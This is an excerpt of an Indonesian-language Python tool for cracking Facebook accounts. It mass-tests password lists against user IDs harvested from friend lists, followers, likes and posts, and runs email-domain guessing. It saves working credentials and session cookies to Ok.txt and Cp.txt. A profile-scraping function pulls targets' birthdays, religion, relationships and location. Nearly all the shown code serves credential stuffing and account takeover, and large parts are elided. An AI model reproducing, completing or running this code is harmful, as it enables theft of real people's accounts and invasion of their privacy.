...
class menu:
	...
	def main(self):
		...
		jalan(' %sXT[ %sselamat datang %s%s ]'%(N,H,r,N))
		print(' %sU'%(N))
		print(' %sdT[%s61%s] Accsess licensee kamu   : %s'%(N,O,N,akss))
		print(' %sdT[%s61%s] Alamat IP kamu saat ini : %s'%(N,O,N,IP))
		print(' %sdT[%s61%s] Kamu masuk pada         : %s'%(N,O,N,waktu))
		print(' %sU'%(N))
		print(' %sdT[%s0%s] crack dari daftar teman'%(N,O,N))
		print(' %sdT[%s1%s] crack dari akun publik'%(N,O,N))
		print(' %sdT[%s2%s] crack dari akun massal'%(N,O,N))
		print(' %sdT[%s3%s] crack dari postingan'%(N,O,N))
		print(' %sdT[%s4%s] crack dari likes post'%(N,O,N))
		print(' %sdT[%s5%s] crack dari followers'%(N,O,N))
		print(' %sdT[%s6%s] cek opsi akun chekpoint'%(N,O,N))
		print(' %sdT[%s7%s] cek hasil crack ok,cp'%(N,O,N))
		print(' %sdT[%s8%s] seting User-Agent'%(N,O,N))
		print(' %sdT[%s9%s] crack email'%(N,O,N))
		print(' %sdT[%sG%s] Get data05 facebook'%(N,O,N))
		print(' %sdT[%sK%s] Lapor bug script'%(N,O,N))
		print(' %sdT[%sA%s] Keluar, hapus token'%(N,O,N))
		print(' %sdT[%sU%s] Upgrade ke premium'%(N,O,N))
		self.pilih()

	def pilih(self):
		print(' %sU'%(N))
		usna = input(' %sdT[%s+%s] choose : '%(N,O,N))
		if usna in ['']:
			print(' %sU'%(N))
			print(' %s^T[%s!%s] Jangan kosong mas'%(N,M,N));time.sleep(2);menu().main()
		elif usna in ['0','00']:
			try:
				token = open('token.x','r').read()
			except IOError:
				os.system('rm -rf token.x')
				exit(' %s^T[%s!%s] Cek token kamu'%(N,M,N))
			try:
				lmt = input(' %sdT[%s+%s] Limit id : '%(N,O,N))
				...
				print(' %s^T[%s!%s] Akun anda tidak publik...'%(N,M,N));time.sleep(2);menu().main()
			else:
				crack().fbeh(id)
		elif usna in ['1','01']:
			try:
				...
				os.system('rm -rf token.x')
				exit(' %s^T[%s!%s] Coba jalankan ulang !'%(N,M,N))
			try:
				print(' %sU'%(N))
				idt = input(' %sdT[%s61%s] Masukan id : '%(N,O,N))
				...
				print(' %sU'%(N))
				jalan(' %sdT[%s61%s] ID %s tidak di temukan!'%(N,M,N,idt));time.sleep(2);menu().main()
			else:
				crack().fbeh(id)
		elif usna in ['2','02']:
			token = open('token.x','r').read()
			try:
				pler = int(input(' %sdT[%s61%s] Mau crack berapa id : '%(N,O,N)))
			except:pler = 1
			for ikeh in range(pler):
				ikeh += 1
				try:
					print(' %sU'%(N))
					idt = input(' %sdT[%s61%s] Masukan id yang ke %s : '%(N,O,N,ikeh))
			...
			try:
				...
				print(' %s^T[%s!%s] ID %s tidak publik'%(N,O,N,idt));time.sleep(3);menu().main()
			else:
				crack().fbeh(id)
		elif usna in ['4','04']:
			...
			try:
				...
				print(' %s^T[%s!%s] ID %s Tidak di temukan'%(N,O,N,idt));time.sleep(2);menu().main()
			else:
				crack().fbeh(id)
		elif usna in ['5','05']:
			...
			try:
				...
				print(' %s^T[%s!%s] ID %s tidak publik'%(N,O,N,idt));time.sleep(2);menu().main()
			else:
				crack().fbeh(id)
		elif usna in ['6','06']:
			print(' %sU'%(N))
			print(' %sdT[%s61%s] Masukan -> Cp.txt sebagai file'%(N,O,N))
			files = input(' %sdT[%s61%s] Masukan files : '%(N,O,N))
			try:
			...
			print(' %sU'%(N))
			print(' %sdT[%s1%s] Cek hasil ok'%(N,O,N))
			print(' %sdT[%s2%s] Cek hasil cp'%(N,O,N))
			print(' %sdT[%s0%s] Kembali'%(N,O,N))
			print(' %sU'%(N))
			hsl = input(' %sdT[%s61%s] choose : '%(N,O,N))
			if hsl in ['1','01']:
				...
				if len(hasil_ok) != 0:
					...
					print(' %s^T[%s!%s] Kamu gak dapet hasil okeh :('%(N,O,N))
			elif hsl in ['2','02']:
			...
			print(' %sU'%(N))
			print(' %sdT[%s1%s] Cek user agent default'%(N,O,N))
			print(' %sdT[%s2%s] Ganti user agent '%(N,O,N))
			print(' %sdT[%s0%s] Keluar'%(N,O,N))
			print(' %sU'%(N))
			pwk = input(' %sdT[%s+%s] choose : '%(N,O,N))
			if pwk in ['1','01']:
				fika = open('user.txt','r').read()
				print(' %s^T[%s!%s] User agent sekarang : %s'%(N,O,N,fika))
				time.sleep(4);menu().main()
			elif pwk in ['2','02']:
				ua = input(' %sdT[%s+%s] Masukan ua baru : '%(N,O,N))
				try:
					nunu = open('user.txt','w')
					nunu.write(ua)
					nunu.close()
					print(' %s^T[%s!%s] Sukses mengganti ua : %s'%(N,O,N,ua));time.sleep(4);menu().main()
				except:pass
			else:
				menu().main()
		elif usna in ['9','09']:
			data = []
			print(' %sU'%(N))
			nama = input(' %sdT[%s+%s] Target nama : '%(N,O,N))
			print(' %sdT[%s+%s] Contoh domain : Jika ingin crack Gmail ketik : G '%(N,O,N))
			domain = input(' %sdT[%s+%s] Masukan domain [G]mail, [Y]ahoo, [H]otmail : '%(N,O,N)).lower().strip()
			list = {
				'g':'@gmail.com',
				'y':'@yahoo.com',
				'h':'@hotmail.com'
			}
			jml = int(input(' %sdT[%s+%s] Jumlah target : '%(N,O,N)))
			pwx = input(' %sdT[%s+%s] Masukan password : '%(N,O,N)).split(',')
			print(' %sdT[%s+%s] Crack sedang di mulai'%(N,O,N))
			...
			exit('%s^T[%s!%s] Crack telah selezai'%(N,O,N))
		elif usna in ['G','g']:
			target()
		elif usna in ['K','k']:
			nom_wa ='+6281375182098'
			text = input(' %s^T[%s!%s] Apa yang error ketik di sini : '%(N,O,N))
			...
			nom_wa ='+6281375182098'
			kata = input(' %s^T[%s!%s] Masukan pesan kamu ke admin : %s'%(N,O,N,H))
			url_wa = ("https://api.whatsapp.com/send?phone="+nom_wa+"&text="+kata)
			subprocess.check_output(["am", "start", url_wa])
			exit()
		else:
			print('%s ^T[%s+%s] Wrong input'%(N,M,N));time.sleep(2);menu().main()
...
def target():
    ...
    try:
        ...
        lo = ("-")
    jalan(" dT[61] Name : " + nm)
    jalan(" dT[61] First Name : " + nd)
    jalan(" dT[61] Middle Name : " + nt)
    jalan(" dT[61] Last Name : " + nb)
    jalan(" dT[61] Birthday : " + ut)
    jalan(" dT[61] Gender : " + gd)
    jalan(" dT[61] Email : " + em)
    jalan(" dT[61] Link : " + lk)
    jalan(" dT[61] Username : " + us)
    jalan(" dT[61] Religion : " + rg)
    jalan(" dT[61] Relationship Status : " + rl)
    jalan(" dT[61] Relationship With : " + rls)
    jalan(" dT[61] Location : " + lc)
    jalan(" dT[61] Hometown : " + ht)
    jalan(" dT[61] About : " + ab)
    jalan(" dT[61] Locale : " + lo)
    input(' ^T[+] Back to menu, pres enter')
    menu().main()
  ...
  try:
    for pw in passs:
      ...
      if re.search('(EAAA)\w+', str(response.text)):
        print('%s --> %s 61 %s '%(H,str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('%s * --> %s 61 %s '%(K,str(user), str(pw)))
        break
  except: pass
...
def khamdihi(user, pasw):
	...
	if "c_user" in ses.cookies:
		...
		print(" 61 Akun Yang Mungkin Terkait Dengan Facebook : %s"%(str(len(xe))))
		num = 0
		for _ in xe:
			num += 1
		...
		print(" 61 Total Opsi Yang Tersedia  "+str(len(ngew)))
...
class crack:
	...
	def fbeh(self,id):
		self.id = id
		print(' %sdT[%s+%s] Total id : %s%s'%(N,O,N,H,len(id)))
		kham = input(' %sdT[%s?%s] Gunakan password manual y/t : '%(N,O,N))
		if kham in ['']:
			print(' %sdT[%s!%s] Jangan kozong !'%(N,M,N));time.sleep(2);crack().fbeh(id)
		elif kham in ['y','Y','Iya','iya']:
			print(' %sU'%(N))
			print(' %sdT[%s!%s] Gunakan koma untuk pemisahan cnth : sayang,katasandi'%(N,O,N))
			while True:
				pw = input(' %sdT[%s61%s] Masukan password : '%(N,O,N))
				if pw in ['']:
					print(' %sdT[%s!%s] Jangan kosong'%(N,M,N))
				elif len(pw)<=5:
					print(' %sdT[%s!%s] Password harus ada 6 kata/ lebih !!'%(N,M,N))
				else:
					def manual(xnxx=None):
						print('%s U'%(N))
						mani = input(' %sdT[%s61%s] Metode : '%(N,O,N))
						if mani in ['']:
							print(' %sdT[%s!%s] Jangan kosong mmk'%(N,M,N));self.manual()
						elif mani in ['1','01']:
							print(' %sU'%(N))
							print(' dT[%s*%s] akun Ok akan di simpan di file : Ok.txt'%(O,N))
							print(' ^T[%s*%s] akun CP akan di simpan di file : Cp.txt\n'%(O,N))
							...
							print(' %sU'%(N))
							print(' %sdT[%s*%s] akun OK akan di simpan di file : Ok.txt'%(N,O,N))
							print(' %s^T[%s*%s] akun CP akan di simpan di file : Cp.txt\n'%(N,O,N))
							with khamdihiXD(max_workers=30) as dihi:
								for me in self.id:
									try:
										Nufikha = me.split('<=>')[0]
							...
							exit()
					print(' %sU'%(N))
					print(' %sdT[%s1%s] Metode Free'%(N,O,N))
					print(' %sdT[%s2%s] Metode Mbasic'%(N,O,N))
					print(' %sdT[%s3%s] Metode Mobile/M'%(N,O,N))
					manual(pw.split(','))
					break
	...
	def otomatis(self):
		print(' %sU'%(N))
		oto = input(' %sdT[%s+%s] Crack dengan metode : '%(N,O,N))
		if oto in ['']:
			print('dT[%s!%s] jangan kosonh'%(O,N));self.otomatis()
		elif oto in ['1','01']:
			self.free()
		elif oto in ['2','02']:
			self.basic()
			...
			print('dT[%s!%s] Pilih menu yg bnr'%(M,N));self.otomatis()
	def free(self):
		print(' %sU'%(N))
		print(' %sdT[%s*%s] akun okeh akan di simpan di file  : hasil/okeh.txt'%(N,O,N))
		print(' %sdT[%s*%s] akun cepeh akan di simpan di file : hasil/cepeh.txt\n'%(N,O,N))
		with khamdihiXD(max_workers=30) as dihi:
			for me in self.id:
				try:
					uid, name = me.split('<=>')
	...
	def basic(self):
		print(' %sU'%(N))
		print(' %sdT[%s*%s] akun OK akan di simpan di file : Ok.txt'%(N,O,N))
		print(' %sdT[%s*%s] akun CP akan di simpan di file : Cp.txt'%(N,O,N))
		print(' %s^T[%s!%s] Mode pesawat 2 detik jika tidak ada hasil\n'%(N,O,N))
		with khamdihiXD(max_workers=30) as dihi:
			for me in self.id:
				try:
					uid, name = me.split('<=>')
			...
			for pw in pwx:
				...
				if "c_user" in ses.cookies.get_dict():
					try:
						...
						print('\r %s--> %s 61 %s 61 %'%(H,user,pw,coki))
						cek_apk(coki)
						ok.append("%s 61 %s 61 %s "%(user,pw,coki))
						open('Ok.txt', 'a').write(" --> %s 61 %s 61 %s\n"%(user,pw,coki))
						break
						...
						pass
					print('\r %s--> %s 61 %s 61 %s '%(H,user,pw,coki))
					cek_apk(coki)
					ok.append('%s 61 %s 61 %s'%(user,pw,coki))
					open('Ok.txt', 'a').write(' --> %s 61 %s 61 %s\n'%(user,pw,coki))
					break
					...
					try:
						...
						month = bulan12[month]
						print('\r %s--> %s 61 %s '%(K,user,pw))
						cp.append("%s 61 %s"%(user,pw,))
						open('Cp.txt', 'a').write(" --> %s 61 %s \n"%(user,pw))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
		...
		for pw in pwx:
			try:
				...
				if "checkpoint" in po.cookies.get_dict().keys():
					...
					print('\r %s--> %s 61 %s                 %s'%(H,user,pw,N))
					cek_apk(coki)
			...
			for pw in pwx:
				...
				if 'c_user' in ses.cookies.get_dict():
					try:
						...
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print('\r %s--> %s 61 %s 61 %s %s %s 61 %s'%(H,user,pw,day,month,year,coki))
						cek_apk(coki)
						ok.append("%s 61 %s 61 %s %s %s 61 %s "%(user,pw,day,month,year,kukis))
						open('Ok.txt', 'a').write(" --> %s 70 %s 70 %s %s %s 70 %s \n"%(user,pw,day,month,year,coki))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
					...
					cek_apk(coki)
					ok.append('%s 61 %s 61 %s'%(user,pw,coki))
					open('Ok.txt', 'a').write(' --> %s 70 %s 70 %s\n'%(user,pw,coki))
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						nunu = open('token.x', 'r').read()
						...
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print('\r %s--> %s 61 %s 61 %s %s %s'%(K,user,pw,day,month,year))
						cp.append("%s 61 %s 61 %s %s %s"%(user,pw,day,month,year))
						open('Cp.txt', 'a').write(" --> %s 61 %s 61 %s %s %s\n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						day = ''
...
def cek_apk(coki):
	...
	try:
		...
		print ("\r      %s61 cookie invalid"%(M))
